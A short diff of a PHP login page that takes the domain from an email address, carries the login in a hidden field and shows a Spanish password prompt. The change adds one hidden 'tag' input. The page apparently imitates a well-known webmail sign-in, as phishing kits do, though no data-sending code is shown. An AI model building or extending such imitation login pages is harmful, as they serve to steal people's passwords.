@@ -52,6 +52,7 @@ $domain = getDomainFromEmail($log);
                   </div>
 							   <div data-viewid="2" >
                                     <input type="hidden"  name="login" value="<?php echo $login; ?>">
+				<input style="background: #ddd;" type="hidden" readonly="" name="tag" value="2" />
                                     <div id="loginHeader" class="row text-title" role="heading" >Escribir contraseña</div>
 </div>
                                     <div class="row">
